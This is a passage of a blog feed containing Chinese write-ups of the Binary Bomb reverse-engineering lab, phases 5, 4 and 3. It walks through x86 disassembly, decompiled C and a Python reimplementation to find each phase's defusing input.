(ZF=0)</span></span><br><span class="line"><span class="symbol">.text:</span>08048DA5                 <span class="keyword">cmp</span>     <span class="built_in">edx</span>, <span class="number">2Ah</span>        <span class="comment">; Compare Two Operands</span></span><br><span class="line"><span class="symbol">.text:</span>08048DA8                 <span class="keyword">jz</span>      short loc_8048DAF <span class="comment">; Jump if Zero (ZF=1)</span></span><br><span class="line"><span class="symbol">.text:</span>08048<span class="keyword">DAA</span>                 <span class="keyword">call</span>    explode_bomb    <span class="comment">; Call Procedure</span></span><br></pre></td></tr></table></figure><p>这部分先逐字符以ascii码的形式存入<code>ecx</code>，<code>and     ecx, 0Fh</code>使得读入字符的高4位为零，效果如下：<br><center><img src="https://s1.ax1x.com/2020/03/24/8OG6PK.jpg" alt="8OG6PK.jpg" border="0"><img src="https://s1.ax1x.com/2020/03/24/8OGWKH.jpg" alt="8OGWKH.jpg" border="0"></center></p><blockquote><p><strong>MOVZX</strong>指令（进行全零扩展并传送）用于无符号整数，将源操作数复制到目的操作数，并把目的操作数 0 扩展到 16 位或 32 位。此处源操作数是1byte=8bit，<code>ecx</code>大小是32bit，此处的用意应该是将目的操作数扩展至<code>ecx</code>大小。</p></blockquote><p>之后将在<code>ds:array_3141[ecx*4]</code>这个数组所在的位置查到的值累加入<code>edx</code>，六次循环读完所有字符后将<code>edx</code>中的值与2Ah进行比较，若相等则可以正常返回。</p><h2 id="查看数组存放内容"><a href="#查看数组存放内容" class="headerlink" title="查看数组存放内容"></a>查看数组存放内容</h2><center><a href="https://imgchr.com/i/8OJ1Qe" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/24/8OJ1Qe.jpg" alt="8OJ1Qe.jpg" border="0"></a></center><p>可以看到输入的字符串的每个字符的ascii码的低四位分别对应了一个数组的值，于是可知通关的条件是<strong>找到这样六个字符，使得以每个字符对应的ascii码的低四位作为数组下标对应的值和为42</strong>。答案不唯一，由于<code>i</code>的ascii为0x69，低四位为9，乘4后对应的数组的值为7,6*7即可凑成42，那么答案之一可为<code>iiiiii</code>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Binary Bomb Phase5 writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Reverse" scheme="https://purewhitywhite.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Binary Bomb Phase4</title>
    <link href="https://purewhitywhite.github.io/2020-03-23/Binary-Bomb-Phase4/"/>
    <id>https://purewhitywhite.github.io/2020-03-23/Binary-Bomb-Phase4/</id>
    <published>2020-03-23T05:57:03.000Z</published>
    <updated>2020-03-23T08:29:23.902Z</updated>
    
    <content type="html"><![CDATA[<p>Binary Bomb Phase4 writeup.</p><a id="more"></a><h1 id="Binary-Bomb-Phase4"><a href="#Binary-Bomb-Phase4" class="headerlink" title="Binary Bomb Phase4"></a>Binary Bomb Phase4</h1><p>获取数据部分跟上一关一样，读入两个数字，不赘述</p><h2 id="参数大小判断"><a href="#参数大小判断" class="headerlink" title="参数大小判断"></a>参数大小判断</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048D37                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span>08048D3B                 <span class="keyword">sub</span>     <span class="built_in">eax</span>, <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>08048D3E                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>08048D41                 <span class="keyword">jbe</span>     short loc_8048D48</span><br></pre></td></tr></table></figure><p>在这一部分中判断了输入的第二个参数是否小于等于4。若大于4则爆炸。</p><h2 id="func4"><a href="#func4" class="headerlink" title="func4"></a>func4</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048D48                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span>08048D4C                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_28], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08048D50                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_2C], <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>08048D57                 <span class="keyword">call</span>    func4</span><br><span class="line"><span class="symbol">.text:</span>08048D5C                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_10]</span><br><span class="line"><span class="symbol">.text:</span>08048D60                 <span class="keyword">jz</span>      short loc_8048D67</span><br></pre></td></tr></table></figure><p>这部分先为func4设置了变量，第一个变量为8，第二个变量为输入的第二个数字。调用func4后注意到将放在<code>eax</code>中的返回值与输入的第一个数字进行比较，若相等则可以正常返回。<br>以func4的参数是（8,4）为例，<code>nexti</code>运行到<code>cmp eax, [esp+2Ch+var_10]</code>指令后<code>info regis</code>查看eax中的值：<br><center><img src="https://s1.ax1x.com/2020/03/23/87mpcD.jpg" alt="87mpcD.jpg" border="0"></center><br>查看效果：<br><center><img src="https://s1.ax1x.com/2020/03/23/87mG40.jpg" alt="87mG40.jpg" border="0"><center></center></center></p><p>结合IDA反编译结果分析func4的汇编指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">func4</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  result = a2;</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = func4(a1 - <span class="number">1</span>, a2) + a2;</span><br><span class="line">    result = v3 + func4(a1 - <span class="number">2</span>, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048CC1 var_1C          = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">1Ch</span></span><br><span class="line"><span class="symbol">.text:</span>08048CC1 var_18          = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">18h</span></span><br><span class="line"><span class="symbol">.text:</span>08048CC1 arg_0           = <span class="built_in">dword</span> <span class="built_in">ptr</span>  <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span>08048CC1 arg_4           = <span class="built_in">dword</span> <span class="built_in">ptr</span>  <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>08048CC1                 <span class="keyword">push</span>    <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>08048CC2                 <span class="keyword">push</span>    <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>08048CC3                 <span class="keyword">push</span>    <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08048CC4                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">10h</span></span><br><span class="line"><span class="symbol">.text:</span>08048CC7                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">esp</span>+<span class="number">1Ch</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span>08048CCB                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">esp</span>+<span class="number">1Ch</span>+arg_4]</span><br><span class="line"><span class="symbol">.text:</span>08048CCF                 <span class="keyword">test</span>    <span class="built_in">ebx</span>, <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08048CD1                 <span class="keyword">jle</span>     short loc_8048CFF     //即if ( a1 &lt;= <span class="number">0</span> ) return <span class="number">0</span><span class="comment">;</span></span><br><span class="line"><span class="symbol">.text:</span>08048CD3                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>//result=a2</span><br><span class="line"><span class="symbol">.text:</span>08048CD5                 <span class="keyword">cmp</span>     <span class="built_in">ebx</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>08048CD8                 <span class="keyword">jz</span>      short loc_8048D04     //即if ( a1 != <span class="number">1</span> )</span><br><span class="line"><span class="symbol">.text:</span>08048CDA                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">1Ch</span>+var_18], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>08048CDE                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebx</span>-<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>08048CE1                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">1Ch</span>+var_1C], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08048CE4                 <span class="keyword">call</span>    func4     //即func4(a1-<span class="number">1</span>,a2)</span><br><span class="line"><span class="symbol">.text:</span>08048CE9                 <span class="keyword">lea</span>     <span class="built_in">edi</span>, [<span class="built_in">eax</span>+<span class="built_in">esi</span>]     //<span class="built_in">edi</span>即v3，v3=func4(a1 - <span class="number">1</span>, a2) + a2</span><br><span class="line"><span class="symbol">.text:</span>08048CEC                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">1Ch</span>+var_18], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>08048CF0                 <span class="keyword">sub</span>     <span class="built_in">ebx</span>, <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>08048CF3                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">1Ch</span>+var_1C], <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08048CF6                 <span class="keyword">call</span>    func4     //即func4(a1-<span class="number">2</span>,a2)</span><br><span class="line"><span class="symbol">.text:</span>08048CFB                 <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="built_in">edi</span>     //return v3+func4(a1 - <span class="number">2</span>, a2)</span><br><span class="line"><span class="symbol">.text:</span>08048CFD                 <span class="keyword">jmp</span>     short loc_8048D04</span><br><span class="line"><span class="symbol">.text:</span>08048CFF                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>08048D04                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">10h</span></span><br><span class="line"><span class="symbol">.text:</span>08048D07                 <span class="keyword">pop</span>     <span class="built_in">ebx</span></span><br><span class="line"><span class="symbol">.text:</span>08048D08                 <span class="keyword">pop</span>     <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>08048D09                 <span class="keyword">pop</span>     <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>08048D0A                 <span class="keyword">retn</span></span><br></pre></td></tr></table></figure><h2 id="计算答案"><a href="#计算答案" class="headerlink" title="计算答案"></a>计算答案</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func4</span><span class="params">(a1, a2)</span>:</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    v3 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> a1 &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    result = a2</span><br><span class="line">    <span class="keyword">if</span> a1 != <span class="number">1</span>:</span><br><span class="line">        v3 = func4(a1<span class="number">-1</span>, a2) + a2</span><br><span class="line">        result = v3 + func4(a1<span class="number">-2</span>, a2)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(func4(<span class="number">8</span>, <span class="number">4</span>))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Binary Bomb Phase4 writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Reverse" scheme="https://purewhitywhite.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Binary Bomb Phase3</title>
    <link href="https://purewhitywhite.github.io/2020-03-22/Binary-Bomb-Phase3/"/>
    <id>https://purewhitywhite.github.io/2020-03-22/Binary-Bomb-Phase3/</id>
    <published>2020-03-22T14:15:40.000Z</published>
    <updated>2020-03-22T15:41:01.529Z</updated>
    
    <content type="html"><![CDATA[<p>Binary Bomb Phase3 writeup.</p><a id="more"></a><h1 id="Binary-Bomb-Phase3"><a href="#Binary-Bomb-Phase3" class="headerlink" title="Binary Bomb Phase3"></a>Binary Bomb Phase3</h1><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048C02                 <span class="meta">public</span> phase_3</span><br><span class="line"><span class="symbol">.text:</span>08048C02 phase_3         proc <span class="built_in">near</span>               <span class="comment">; CODE XREF: main+F6↑p</span></span><br><span class="line"><span class="symbol">.text:</span>08048C02</span><br><span class="line"><span class="symbol">.text:</span>08048C02 var_2C          = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">2Ch</span></span><br><span class="line"><span class="symbol">.text:</span>08048C02 var_28          = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">28h</span></span><br><span class="line"><span class="symbol">.text:</span>08048C02 var_24          = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">24h</span></span><br><span class="line"><span class="symbol">.text:</span>08048C02 var_20          = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">20h</span></span><br><span class="line"><span class="symbol">.text:</span>08048C02 var_14          = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">14h</span></span><br><span class="line"><span class="symbol">.text:</span>08048C02 var_10          = <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">10h</span></span><br><span class="line"><span class="symbol">.text:</span>08048C02 arg_0           = <span class="built_in">dword</span> <span class="built_in">ptr</span>  <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span>08048C02</span><br><span class="line"><span class="symbol">.text:</span>08048C02 <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>08048C02                 <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">2Ch</span></span><br><span class="line"><span class="symbol">.text:</span>08048C05                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_10]</span><br><span class="line"><span class="symbol">.text:</span>08048C09                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_20], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08048C0D                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span>08048C11                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_24], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08048C15                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_28], offset <span class="keyword">aDD</span> <span class="comment">; "%d %d"</span></span><br><span class="line"><span class="symbol">.text:</span>08048C1D                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">2Ch</span>+arg_0]</span><br><span class="line"><span class="symbol">.text:</span>08048C21                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_2C], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>08048C24                 <span class="keyword">call</span>    ___isoc99_sscanf</span><br><span class="line"><span class="symbol">.text:</span>08048C29                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>08048C2C                 <span class="keyword">jg</span>      short loc_8048C33</span><br><span class="line"><span class="symbol">.text:</span>08048C2E                 <span class="keyword">call</span>    explode_bomb</span><br></pre></td></tr></table></figure><p>同上一关一样使用了<code>sscanf</code>函数，具体形式为<code>__isoc99_sscanf( 输入的字符串, &quot;%d %d&quot;, &amp;v9, &amp;v10)</code>，可知本关要求输入两个数字，最后对输入数字个数进行判断，若大于1个就继续向下。</p><h2 id="Switch跳转计算"><a href="#Switch跳转计算" class="headerlink" title="Switch跳转计算"></a>Switch跳转计算</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048C33</span><br><span class="line"><span class="symbol">.text:</span>08048C33 loc_8048C33:                            <span class="comment">; CODE XREF: phase_3+2A↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C33                 <span class="keyword">cmp</span>     [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_14], <span class="number">7</span> <span class="comment">; switch 8 cases</span></span><br><span class="line"><span class="symbol">.text:</span>08048C38                 <span class="keyword">ja</span>      short loc_8048CA0 <span class="comment">; jumptable 08048C3E default case</span></span><br><span class="line"><span class="symbol">.text:</span>08048C3A                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_14]</span><br><span class="line"><span class="symbol">.text:</span>08048C3E                 <span class="keyword">jmp</span>     <span class="built_in">ds</span>:off_804A180[<span class="built_in">eax</span>*<span class="number">4</span>] <span class="comment">; switch jump</span></span><br><span class="line"><span class="symbol">.text:</span>08048C45 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>08048C45</span><br><span class="line"><span class="symbol">.text:</span>08048C45 loc_8048C45:                            <span class="comment">; CODE XREF: phase_3+3C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C45                                         <span class="comment">; DATA XREF: .rodata:off_804A180↓o</span></span><br><span class="line"><span class="symbol">.text:</span>08048C45                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span>          <span class="comment">; jumptable 08048C3E case 1</span></span><br><span class="line"><span class="symbol">.text:</span>08048C4A                 <span class="keyword">jmp</span>     short loc_8048C51</span><br><span class="line"><span class="symbol">.text:</span>08048C4C <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>08048C4C</span><br><span class="line"><span class="symbol">.text:</span>08048C4C loc_8048C4C:                            <span class="comment">; CODE XREF: phase_3+3C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C4C                                         <span class="comment">; DATA XREF: .rodata:off_804A180↓o</span></span><br><span class="line"><span class="symbol">.text:</span>08048C4C                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">455</span>        <span class="comment">; jumptable 08048C3E case 0</span></span><br><span class="line"><span class="symbol">.text:</span>08048C51</span><br><span class="line"><span class="symbol">.text:</span>08048C51 loc_8048C51:                            <span class="comment">; CODE XREF: phase_3+48↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C51                 <span class="keyword">sub</span>     <span class="built_in">eax</span>, <span class="number">356</span></span><br><span class="line"><span class="symbol">.text:</span>08048C56                 <span class="keyword">jmp</span>     short loc_8048C5D</span><br><span class="line"><span class="symbol">.text:</span>08048C58 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>08048C58</span><br><span class="line"><span class="symbol">.text:</span>08048C58 loc_8048C58:                            <span class="comment">; CODE XREF: phase_3+3C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C58                                         <span class="comment">; DATA XREF: .rodata:off_804A180↓o</span></span><br><span class="line"><span class="symbol">.text:</span>08048C58                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span>          <span class="comment">; jumptable 08048C3E case 2</span></span><br><span class="line"><span class="symbol">.text:</span>08048C5D</span><br><span class="line"><span class="symbol">.text:</span>08048C5D loc_8048C5D:                            <span class="comment">; CODE XREF: phase_3+54↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C5D                 <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">692</span></span><br><span class="line"><span class="symbol">.text:</span>08048C62                 <span class="keyword">jmp</span>     short loc_8048C69</span><br><span class="line"><span class="symbol">.text:</span>08048C64 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>08048C64</span><br><span class="line"><span class="symbol">.text:</span>08048C64 loc_8048C64:                            <span class="comment">; CODE XREF: phase_3+3C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C64                                         <span class="comment">; DATA XREF: .rodata:off_804A180↓o</span></span><br><span class="line"><span class="symbol">.text:</span>08048C64                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span>          <span class="comment">; jumptable 08048C3E case 3</span></span><br><span class="line"><span class="symbol">.text:</span>08048C69</span><br><span class="line"><span class="symbol">.text:</span>08048C69 loc_8048C69:                            <span class="comment">; CODE XREF: phase_3+60↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C69                 <span class="keyword">sub</span>     <span class="built_in">eax</span>, <span class="number">389</span></span><br><span class="line"><span class="symbol">.text:</span>08048C6E                 <span class="keyword">jmp</span>     short loc_8048C75</span><br><span class="line"><span class="symbol">.text:</span>08048C70 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>08048C70</span><br><span class="line"><span class="symbol">.text:</span>08048C70 loc_8048C70:                            <span class="comment">; CODE XREF: phase_3+3C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C70                                         <span class="comment">; DATA XREF: .rodata:off_804A180↓o</span></span><br><span class="line"><span class="symbol">.text:</span>08048C70                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span>          <span class="comment">; jumptable 08048C3E case 4</span></span><br><span class="line"><span class="symbol">.text:</span>08048C75</span><br><span class="line"><span class="symbol">.text:</span>08048C75 loc_8048C75:                            <span class="comment">; CODE XREF: phase_3+6C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C75                 <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">389</span></span><br><span class="line"><span class="symbol">.text:</span>08048C7A                 <span class="keyword">jmp</span>     short loc_8048C81</span><br><span class="line"><span class="symbol">.text:</span>08048C7C <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>08048C7C</span><br><span class="line"><span class="symbol">.text:</span>08048C7C loc_8048C7C:                            <span class="comment">; CODE XREF: phase_3+3C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C7C                                         <span class="comment">; DATA XREF: .rodata:off_804A180↓o</span></span><br><span class="line"><span class="symbol">.text:</span>08048C7C                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span>          <span class="comment">; jumptable 08048C3E case 5</span></span><br><span class="line"><span class="symbol">.text:</span>08048C81</span><br><span class="line"><span class="symbol">.text:</span>08048C81 loc_8048C81:                            <span class="comment">; CODE XREF: phase_3+78↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C81                 <span class="keyword">sub</span>     <span class="built_in">eax</span>, <span class="number">389</span></span><br><span class="line"><span class="symbol">.text:</span>08048C86                 <span class="keyword">jmp</span>     short loc_8048C8D</span><br><span class="line"><span class="symbol">.text:</span>08048C88 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>08048C88</span><br><span class="line"><span class="symbol">.text:</span>08048C88 loc_8048C88:                            <span class="comment">; CODE XREF: phase_3+3C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C88                                         <span class="comment">; DATA XREF: .rodata:off_804A180↓o</span></span><br><span class="line"><span class="symbol">.text:</span>08048C88                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span>          <span class="comment">; jumptable 08048C3E case 6</span></span><br><span class="line"><span class="symbol">.text:</span>08048C8D</span><br><span class="line"><span class="symbol">.text:</span>08048C8D loc_8048C8D:                            <span class="comment">; CODE XREF: phase_3+84↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C8D                 <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">389</span></span><br><span class="line"><span class="symbol">.text:</span>08048C92                 <span class="keyword">jmp</span>     short loc_8048C99</span><br><span class="line"><span class="symbol">.text:</span>08048C94 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>08048C94</span><br><span class="line"><span class="symbol">.text:</span>08048C94 loc_8048C94:                            <span class="comment">; CODE XREF: phase_3+3C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C94                                         <span class="comment">; DATA XREF: .rodata:off_804A180↓o</span></span><br><span class="line"><span class="symbol">.text:</span>08048C94                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span>          <span class="comment">; jumptable 08048C3E case 7</span></span><br><span class="line"><span class="symbol">.text:</span>08048C99</span><br><span class="line"><span class="symbol">.text:</span>08048C99 loc_8048C99:                            <span class="comment">; CODE XREF: phase_3+90↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048C99                 <span class="keyword">sub</span>     <span class="built_in">eax</span>, <span class="number">389</span></span><br><span class="line"><span class="symbol">.text:</span>08048C9E                 <span class="keyword">jmp</span>     short loc_8048CAA</span><br><span class="line"><span 